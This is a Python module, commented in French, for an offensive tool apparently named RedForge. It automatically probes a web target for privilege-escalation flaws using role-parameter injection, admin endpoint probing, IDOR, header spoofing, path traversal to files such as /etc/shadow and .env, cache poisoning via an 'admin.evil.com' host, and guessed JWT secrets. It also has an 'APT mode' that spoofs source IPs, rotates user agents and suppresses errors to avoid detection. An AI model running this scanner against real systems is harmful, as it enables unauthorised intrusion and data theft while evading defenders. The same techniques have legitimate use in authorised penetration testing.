#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module d'élévation de privilèges pour RedForge
Détecte les vulnérabilités permettant d'élever ses privilèges
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
import json
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import base64

@dataclass
class PrivilegeEscalationConfig:
    """Configuration avancée pour l'élévation de privilèges"""
    # Délais
    delay_between_tests: Tuple[float, float] = (1, 3)
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    
    # Comportement
    test_all_endpoints: bool = True
    aggressive_mode: bool = False
    max_depth: int = 3
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    respect_rate_limits: bool = True
    
    # APT
    apt_mode: bool = False
    human_behavior: bool = False
    slow_scan: bool = False
    
    # Techniques spécifiques
    test_jwt_manipulation: bool = True
    test_graphql_introspection: bool = True
    test_privilege_escalation_via_api: bool = True
    test_horizontal_escalation: bool = True
    
    # Proxies
    proxies: List[str] = field(default_factory=list)


class PrivilegeEscalation:
    """Élévation de privilèges avancée dans l'application"""
    
    def __init__(self, config: Optional[PrivilegeEscalationConfig] = None):
        """
        Initialise l'élévation de privilèges
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or PrivilegeEscalationConfig()
        
        # Patterns d'administration
        self.admin_patterns = [
            'admin', 'administrator', 'root', 'superuser', 'superadmin',
            'owner', 'moderator', 'manager', 'supervisor', 'sysadmin',
            'devops', 'operator', 'controller', 'auditor', 'reviewer'
        ]
        
        # Paramètres de rôle à tester
        self.role_parameters = [
            'role', 'group', 'level', 'permission', 'access', 'privilege',
            'is_admin', 'admin', 'user_type', 'user_role', 'account_type',
            'role_id', 'group_id', 'permission_level', 'access_level',
            'privilege_level', 'security_level', 'clearance'
        ]
        
        # Endpoints sensibles
        self.endpoints_sensitive = [
            '/admin', '/administrator', '/manage', '/dashboard/admin',
            '/api/admin', '/admin/users', '/admin/settings', '/user/role',
            '/admin/panel', '/controlpanel', '/sysadmin', '/management',
            '/api/v1/admin', '/admin/api', '/superadmin', '/root'
        ]
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]
        
        # Métriques
        self.start_time = None
        self.test_count = 0
        self.success_count = 0
        self.rate_limit_hits = 0
        
        # Cache
        self.tested_endpoints: Set[str] = set()
        self.discovered_users: Set[str] = set()
        
        # JWT secrets courants pour tests
        self.jwt_secrets = [
            'secret', 'secretkey', 'jwtsecret', 'mysecret', 'supersecret',
            'adminsecret', 'key', 'password', 'changeme', 'default'
        ]
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les vulnérabilités d'élévation de privilèges
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - session_cookie: Cookie de session utilisateur
                - low_privilege_user: Compte basse privilège
                - test_endpoints: Tester les endpoints sensibles
                - apt_mode: Mode APT
                - jwt_token: Token JWT à tester
        """
        self.start_time = time.time()
        self.test_count = 0
        self.success_count = 0
        self.tested_endpoints.clear()
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        print(f"  → Test d'élévation de privilèges sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Scan lent et discret")
        
        vulnerabilities = []
        
        # Techniques d'élévation de privilèges
        techniques = [
            ("role_parameters", self._test_role_parameters),
            ("admin_endpoints", self._test_admin_endpoints),
            ("idor", self._test_idor),
            ("header_injection", self._test_header_injection),
            ("api_privileges", self._test_api_privileges),
            ("jwt_manipulation", self._test_jwt_manipulation),
            ("graphql_introspection", self._test_graphql_introspection),
            ("horizontal_escalation", self._test_horizontal_escalation),
            ("parameter_pollution", self._test_parameter_pollution),
            ("path_traversal", self._test_path_traversal_privilege),
            ("cache_poisoning", self._test_cache_poisoning),
            ("csrf_bypass", self._test_csrf_bypass)
        ]
        
        for tech_name, tech_func in techniques:
            # Pause APT
            if self.config.apt_mode and self.config.human_behavior:
                self._apt_pause()
            elif self.config.random_delays:
                time.sleep(random.uniform(*self.config.delay_between_tests))
            
            try:
                tech_vulns = tech_func(target, **kwargs)
                vulnerabilities.extend(tech_vulns)
                self.test_count += 1
                
                if tech_vulns:
                    self.success_count += len(tech_vulns)
                    for vuln in tech_vulns:
                        print(f"      ✓ {vuln['type']}: {vuln.get('details', '')}")
                    
                    if not self.config.aggressive_mode and kwargs.get('stop_on_find', True):
                        break
                        
            except Exception as e:
                if self.config.apt_mode:
                    # En mode APT, logger discrètement
                    pass
                else:
                    print(f"      ⚠️ Erreur technique {tech_name}: {e}")
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'test_all_endpoints' in kwargs:
            self.config.test_all_endpoints = kwargs['test_all_endpoints']
        if 'aggressive_mode' in kwargs:
            self.config.aggressive_mode = kwargs['aggressive_mode']
        if 'max_depth' in kwargs:
            self.config.max_depth = kwargs['max_depth']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.human_behavior = True
            self.config.slow_scan = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.delay_between_tests = (5, 15)
            self.config.delay_between_requests = (2, 5)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'no-cache'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['X-Forwarded-For'] = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
            headers['X-Requested-With'] = 'XMLHttpRequest'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _test_role_parameters(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste l'injection/modification de paramètres de rôle"""
        vulnerabilities = []
        session_cookie = kwargs.get('session_cookie')
        cookies = {'session': session_cookie} if session_cookie else {}
        
        admin_values = ['admin', '1', 'true', 'administrator', 'superadmin', 
                       'root', '2', 'yes', 'on', 'enabled']
        
        for role_param in self.role_parameters:
            for admin_value in admin_values:
                try:
                    # Tester en GET
                    parsed = urlparse(target)
                    query = parse_qs(parsed.query)
                    query[role_param] = [admin_value]
                    new_query = urlencode(query, doseq=True)
                    test_url = urlunparse(parsed._replace(query=new_query))
                    
                    headers = self._get_stealth_headers()
                    response = requests.get(test_url, headers=headers, cookies=cookies, 
                                          timeout=10, verify=False)
                    
                    if self._is_admin_response(response):
                        vulnerabilities.append({
                            "type": "role_parameter_injection",
                            "severity": "CRITICAL",
                            "details": f"Paramètre {role_param}={admin_value} donne accès admin",
                            "parameter": role_param,
                            "value": admin_value,
                            "risk_score": 95
                        })
                        break
                    
                    # Délai
                    if self.config.random_delays:
                        time.sleep(random.uniform(*self.config.delay_between_requests))
                        
                except Exception:
                    continue
        
        return vulnerabilities
    
    def _test_admin_endpoints(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste l'accès aux endpoints admin sans authentification"""
        vulnerabilities = []
        
        for endpoint in self.endpoints_sensitive:
            if endpoint in self.tested_endpoints:
                continue
            
            test_url = target.rstrip('/') + endpoint
            self.tested_endpoints.add(endpoint)
            
            try:
                headers = self._get_stealth_headers()
                response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                
                if response.status_code == 200:
                    if self._is_admin_response(response):
                        vulnerabilities.append({
                            "type": "admin_endpoint_exposed",
                            "severity": "CRITICAL",
                            "details": f"Endpoint admin exposé sans auth: {endpoint}",
                            "url": test_url,
                            "risk_score": 90
                        })
                elif response.status_code == 403:
                    if 'admin' in response.text.lower():
                        vulnerabilities.append({
                            "type": "admin_endpoint_info_leak",
                            "severity": "MEDIUM",
                            "details": f"Information admin divulguée sur {endpoint}",
                            "url": test_url,
                            "risk_score": 60
                        })
                
                # Délai
                if self.config.random_delays:
                    time.sleep(random.uniform(*self.config.delay_between_requests))
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _test_idor(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste les vulnérabilités IDOR"""
        vulnerabilities = []
        session_cookie = kwargs.get('session_cookie')
        cookies = {'session': session_cookie} if session_cookie else {}
        
        # Patterns IDOR avancés
        idor_patterns = [
            (r'user_id[=:](\d+)', [1, 2, 3, 999, 1000]),
            (r'id[=:](\d+)', [1, 2, 3, 999, 1000]),
            (r'uid[=:](\d+)', [1, 2, 3, 999, 1000]),
            (r'profile[=:](\d+)', [1, 2, 3, 999, 1000]),
            (r'order_id[=:](\d+)', [1, 2, 3, 999, 1000]),
            (r'invoice[=:](\d+)', [1, 2, 3, 999, 1000]),
            (r'document[=:](\d+)', [1, 2, 3, 999, 1000]),
            (r'account[=:](\d+)', [1, 2, 3, 999, 1000]),
            (r'[?&]id=(\d+)', [1, 2, 3, 999, 1000]),
            (r'/[a-z]+/(\d+)/', [1, 2, 3, 999, 1000])
        ]
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, cookies=cookies, 
                                  timeout=10, verify=False)
            
            for pattern, test_ids in idor_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                
                for match in matches[:5]:  # Limiter les tests
                    try:
                        current_id = int(match)
                        for test_id in test_ids:
                            if test_id == current_id:
                                continue
                            
                            test_url = re.sub(pattern, f'\\1={test_id}', response.url)
                            if test_url != response.url:
                                test_response = requests.get(test_url, headers=headers, 
                                                           cookies=cookies, timeout=10, verify=False)
                                
                                if test_response.status_code == 200 and test_response.text != response.text:
                                    vulnerabilities.append({
                                        "type": "idor",
                                        "severity": "HIGH",
                                        "details": f"IDOR possible: accès à ressource {test_id}",
                                        "url": test_url,
                                        "risk_score": 85
                                    })
                                    break
                                    
                    except ValueError:
                        continue
                        
        except Exception:
            pass
        
        return vulnerabilities
    
    def _test_header_injection(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste l'injection de headers pour élever les privilèges"""
        vulnerabilities = []
        
        # Headers à tester
        test_headers = [
            ('X-Forwarded-For', '127.0.0.1'),
            ('X-Original-URL', '/admin'),
            ('X-Rewrite-URL', '/admin'),
            ('X-Proxy-IP', '127.0.0.1'),
            ('X-Real-IP', '127.0.0.1'),
            ('X-Remote-IP', '127.0.0.1'),
            ('X-Remote-Addr', '127.0.0.1'),
            ('X-Admin', 'true'),
            ('X-User-Role', 'admin'),
            ('X-Privilege', 'admin'),
            ('X-Role', 'admin'),
            ('X-Access-Level', 'admin'),
            ('X-Permission', 'full'),
            ('X-Superuser', '1'),
            ('X-Debug', '1'),
            ('X-Forwarded-For', 'localhost'),
            ('Client-IP', '127.0.0.1')
        ]
        
        for header_name, header_value in test_headers:
            try:
                headers = self._get_stealth_headers({header_name: header_value})
                response = requests.get(target, headers=headers, timeout=10, verify=False)
                
                if self._is_admin_response(response):
                    vulnerabilities.append({
                        "type": "header_injection",
                        "severity": "HIGH",
                        "details": f"Header {header_name}: {header_value} donne accès admin",
                        "header": header_name,
                        "value": header_value,
                        "risk_score": 80
                    })
                    
                # Délai
                if self.config.random_delays:
                    time.sleep(random.uniform(*self.config.delay_between_requests))
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _test_api_privileges(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste les vulnérabilités d'API pour l'élévation de privilèges"""
        vulnerabilities = []
        session_cookie = kwargs.get('session_cookie')
        cookies = {'session': session_cookie} if session_cookie else {}
        
        # Endpoints API sensibles
        api_endpoints = [
            '/api/users', '/api/admin/users', '/api/roles', '/api/permissions',
            '/api/settings', '/api/config', '/api/user/role', '/api/privileges',
            '/api/v1/users', '/api/v2/users', '/graphql', '/api/graphql',
            '/api/admin', '/api/management', '/api/audit', '/api/logs'
        ]
        
        for endpoint in api_endpoints:
            test_url = target.rstrip('/') + endpoint
            
            # Tester différentes méthodes HTTP
            for method in ['GET', 'POST', 'PUT', 'DELETE', 'PATCH']:
                try:
                    headers = self._get_stealth_headers()
                    
                    if method == 'GET':
                        response = requests.get(test_url, headers=headers, cookies=cookies, 
                                              timeout=10, verify=False)
                    elif method == 'POST':
                        response = requests.post(test_url, headers=headers, cookies=cookies, 
                                               timeout=10, verify=False)
                    elif method == 'PUT':
                        response = requests.put(test_url, headers=headers, cookies=cookies, 
                                              timeout=10, verify=False)
                    elif method == 'PATCH':
                        response = requests.patch(test_url, headers=headers, cookies=cookies, 
                                                timeout=10, verify=False)
                    else:
                        response = requests.delete(test_url, headers=headers, cookies=cookies, 
                                                 timeout=10, verify=False)
                    
                    if response.status_code == 200:
                        if 'admin' in response.text.lower() or 'user' in response.text.lower():
                            vulnerabilities.append({
                                "type": "api_privilege_escalation",
                                "severity": "HIGH",
                                "details": f"API exposée avec privilèges: {method} {endpoint}",
                                "url": test_url,
                                "risk_score": 85
                            })
                            break
                            
                except Exception:
                    continue
        
        return vulnerabilities
    
    def _test_jwt_manipulation(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste la manipulation de tokens JWT pour élévation de privilèges"""
        vulnerabilities = []
        jwt_token = kwargs.get('jwt_token')
        
        if not jwt_token and not self.config.test_jwt_manipulation:
            return vulnerabilities
        
        try:
            # Chercher des tokens JWT dans les réponses
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            jwt_pattern = r'eyJ[A-Za-z0-9-_=]+\.[A-Za-z0-9-_=]+\.?[A-Za-z0-9-_.+/=]*'
            tokens = re.findall(jwt_pattern, response.text)
            
            for token in tokens:
                # Analyser le token
                try:
                    parts = token.split('.')
                    if len(parts) >= 2:
                        # Décoder le payload
                        payload = parts[1]
                        payload += '=' * (4 - len(payload) % 4)
                        decoded = base64.b64decode(payload).decode('utf-8')
                        
                        # Vérifier les claims de privilèges
                        privilege_claims = ['role', 'admin', 'is_admin', 'group', 'level']
                        for claim in privilege_claims:
                            if claim in decoded.lower():
                                # Tenter de modifier le token
                                modified_payload = decoded.replace('"user"', '"admin"')
                                modified_payload = modified_payload.replace('"member"', '"admin"')
                                
                                vulnerabilities.append({
                                    "type": "jwt_manipulation",
                                    "severity": "CRITICAL",
                                    "details": f"Token JWT modifiable - claims de privilège trouvés",
                                    "risk_score": 95
                                })
                                break
                                
                except Exception:
                    continue
                    
        except Exception:
            pass
        
        return vulnerabilities
    
    def _test_graphql_introspection(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste l'introspection GraphQL pour découvrir des privilèges cachés"""
        vulnerabilities = []
        
        if not self.config.test_graphql_introspection:
            return vulnerabilities
        
        graphql_endpoints = ['/graphql', '/api/graphql', '/gql', '/query']
        
        introspection_query = """
        {
          __schema {
            types {
              name
              fields {
                name
                type {
                  name
                }
              }
            }
          }
        }
        """
        
        for endpoint in graphql_endpoints:
            test_url = target.rstrip('/') + endpoint
            
            try:
                headers = self._get_stealth_headers({'Content-Type': 'application/json'})
                data = {'query': introspection_query}
                
                response = requests.post(test_url, headers=headers, json=data, 
                                       timeout=10, verify=False)
                
                if response.status_code == 200:
                    data = response.json()
                    if '__schema' in data:
                        # Chercher des mutations admin
                        admin_mutations = ['admin', 'createUser', 'deleteUser', 'updateRole']
                        found_mutations = [m for m in admin_mutations if m in str(data)]
                        
                        if found_mutations:
                            vulnerabilities.append({
                                "type": "graphql_introspection",
                                "severity": "HIGH",
                                "details": f"Introspection GraphQL activée - mutations admin trouvées",
                                "endpoint": endpoint,
                                "risk_score": 85
                            })
                            
            except Exception:
                continue
        
        return vulnerabilities
    
    def _test_horizontal_escalation(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste l'élévation horizontale de privilèges (accès à d'autres comptes)"""
        vulnerabilities = []
        
        if not self.config.test_horizontal_escalation:
            return vulnerabilities
        
        # Patterns d'identifiants utilisateur
        user_patterns = [
            r'user[_-]?id[=:]\d+',
            r'account[=:]\d+',
            r'profile[=:]\d+',
            r'/[a-z]+/(\d+)/',
            r'userId=(\d+)'
        ]
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            for pattern in user_patterns:
                matches = re.findall(pattern, response.text, re.IGNORECASE)
                
                for match in matches[:3]:
                    # Tenter d'accéder à d'autres utilisateurs
                    test_id = int(match) + 1 if match.isdigit() else 2
                    test_url = re.sub(r'\d+', str(test_id), response.url)
                    
                    if test_url != response.url:
                        test_response = requests.get(test_url, headers=headers, 
                                                   timeout=10, verify=False)
                        
                        if test_response.status_code == 200 and test_response.text != response.text:
                            vulnerabilities.append({
                                "type": "horizontal_escalation",
                                "severity": "HIGH",
                                "details": f"Accès possible à d'autres comptes utilisateur",
                                "url": test_url,
                                "risk_score": 85
                            })
                            
        except Exception:
            pass
        
        return vulnerabilities
    
    def _test_parameter_pollution(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste la pollution de paramètres HTTP"""
        vulnerabilities = []
        session_cookie = kwargs.get('session_cookie')
        cookies = {'session': session_cookie} if session_cookie else {}
        
        # Paramètres à polluer
        test_params = ['role', 'admin', 'privilege', 'group', 'level']
        
        for param in test_params:
            try:
                # Envoyer le paramètre deux fois
                test_url = f"{target}?{param}=user&{param}=admin"
                
                headers = self._get_stealth_headers()
                response = requests.get(test_url, headers=headers, cookies=cookies, 
                                      timeout=10, verify=False)
                
                if self._is_admin_response(response):
                    vulnerabilities.append({
                        "type": "parameter_pollution",
                        "severity": "HIGH",
                        "details": f"Pollution de paramètre {param} permet élévation",
                        "parameter": param,
                        "risk_score": 80
                    })
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _test_path_traversal_privilege(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste le path traversal pour accéder à des fichiers sensibles"""
        vulnerabilities = []
        
        # Paths sensibles à tester
        sensitive_paths = [
            '/etc/passwd', '/etc/shadow', '/proc/self/environ',
            '/var/log/apache2/access.log', '/var/log/nginx/access.log',
            '../config/database.yml', '../../config/database.yml',
            'WEB-INF/web.xml', 'WEB-INF/applicationContext.xml',
            '.env', '.git/config', 'config.php', 'wp-config.php'
        ]
        
        traversal_patterns = [
            '../../../', '../../', '../', '....//', '..;/'
        ]
        
        for path in sensitive_paths:
            for pattern in traversal_patterns:
                test_path = pattern + path
                test_url = target.rstrip('/') + '/' + test_path
                
                try:
                    headers = self._get_stealth_headers()
                    response = requests.get(test_url, headers=headers, timeout=10, verify=False)
                    
                    if response.status_code == 200 and len(response.text) > 100:
                        # Vérifier si le contenu semble sensible
                        if 'password' in response.text.lower() or 'secret' in response.text.lower():
                            vulnerabilities.append({
                                "type": "path_traversal_privilege",
                                "severity": "CRITICAL",
                                "details": f"Path traversal vers fichier sensible: {test_path}",
                                "url": test_url,
                                "risk_score": 95
                            })
                            
                except Exception:
                    continue
        
        return vulnerabilities
    
    def _test_cache_poisoning(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste l'empoisonnement de cache pour élévation de privilèges"""
        vulnerabilities = []
        
        # Headers de cache à tester
        cache_headers = [
            'X-Forwarded-Host', 'X-Forwarded-Scheme', 'X-Original-Host',
            'X-Rewrite-URL', 'X-HTTP-Method-Override'
        ]
        
        for header in cache_headers:
            try:
                headers = self._get_stealth_headers({header: 'admin.evil.com'})
                response = requests.get(target, headers=headers, timeout=10, verify=False)
                
                if 'admin.evil.com' in response.text:
                    vulnerabilities.append({
                        "type": "cache_poisoning",
                        "severity": "MEDIUM",
                        "details": f"Cache poisoning possible via {header}",
                        "header": header,
                        "risk_score": 70
                    })
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _test_csrf_bypass(self, target: str, **kwargs) -> List[Dict[str, Any]]:
        """Teste le contournement CSRF pour actions privilégiées"""
        vulnerabilities = []
        
        # Tester l'absence de tokens CSRF
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            csrf_patterns = [
                r'csrf_token', r'_token', r'csrf', r'X-CSRF-Token',
                r'CSRFToken', r'csrfmiddlewaretoken'
            ]
            
            csrf_found = any(re.search(p, response.text, re.IGNORECASE) for p in csrf_patterns)
            
            if not csrf_found:
                vulnerabilities.append({
                    "type": "csrf_bypass",
                    "severity": "MEDIUM",
                    "details": "Absence de protection CSRF pour actions privilégiées",
                    "risk_score": 65
                })
                
        except Exception:
            pass
        
        return vulnerabilities
    
    def _is_admin_response(self, response: requests.Response) -> bool:
        """Détermine si la réponse semble être une interface admin"""
        admin_indicators = [
            'dashboard', 'admin panel', 'administration', 'gestion',
            'users', 'settings', 'configuration', 'statistics',
            'user management', 'role management', 'permissions',
            'system settings', 'audit log', 'backup', 'restore'
        ]
        
        text = response.text.lower()
        text_length = len(text)
        
        # Vérifier les indicateurs
        indicator_count = sum(1 for ind in admin_indicators if ind in text)
        
        # Une page admin typique contient plusieurs indicateurs
        return indicator_count >= 2 and text_length > 500
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 180)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "test_duration": duration,
            "tests_performed": self.test_count,
            "successful_tests": self.success_count,
            "config": {
                "apt_mode": self.config.apt_mode,
                "aggressive_mode": self.config.aggressive_mode,
                "techniques_tested": 12
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité d'élévation détectée"}
        
        severities = {}
        types = {}
        max_risk = 0
        
        for v in vulnerabilities:
            sev = v.get('severity', 'MEDIUM')
            severities[sev] = severities.get(sev, 0) + 1
            
            vtype = v.get('type', 'unknown')
            types[vtype] = types.get(vtype, 0) + 1
            
            risk = v.get('risk_score', 0)
            max_risk = max(max_risk, risk)
        
        return {
            "total": len(vulnerabilities),
            "by_severity": severities,
            "by_type": types,
            "max_risk_score": max_risk,
            "critical_findings": len([v for v in vulnerabilities if v.get('severity') == 'CRITICAL'])
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        vuln_types = [v['type'] for v in vulnerabilities]
        
        if 'role_parameter_injection' in vuln_types:
            recommendations.add("Ne jamais faire confiance aux paramètres client pour les contrôles de rôle")
            recommendations.add("Implémenter les contrôles d'accès côté serveur uniquement")
        
        if 'admin_endpoint_exposed' in vuln_types:
            recommendations.add("Restreindre l'accès aux endpoints admin par IP ou réseau")
            recommendations.add("Implémenter une authentification forte pour toutes les interfaces admin")
        
        if 'idor' in vuln_types:
            recommendations.add("Utiliser des références indirectes (UUID) plutôt que des IDs séquentiels")
            recommendations.add("Vérifier l'autorisation d'accès à chaque ressource")
        
        if 'jwt_manipulation' in vuln_types:
            recommendations.add("Utiliser des signatures JWT fortes et vérifier la signature")
            recommendations.add("Ne pas stocker d'informations sensibles dans les claims JWT")
        
        if 'graphql_introspection' in vuln_types:
            recommendations.add("Désactiver l'introspection GraphQL en production")
            recommendations.add("Implémenter des contrôles d'accès au niveau des champs GraphQL")
        
        if not recommendations:
            recommendations.add("Auditer régulièrement les contrôles d'accès")
            recommendations.add("Implémenter le principe du moindre privilège")
        
        return list(recommendations)


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    pe = PrivilegeEscalation()
    results = pe.scan("https://example.com")
    print(f"Vulnérabilités d'élévation: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = PrivilegeEscalationConfig(apt_mode=True, slow_scan=True)
    pe_apt = PrivilegeEscalation(config=apt_config)
    results_apt = pe_apt.scan(
        "https://example.com",
        session_cookie="valid_session_123",
        apt_mode=True,
        test_all_endpoints=True
    )
    print(f"Vulnérabilités trouvées (APT): {results_apt['count']}")
    for rec in results_apt['recommendations']:
        print(f"Recommandation: {rec}")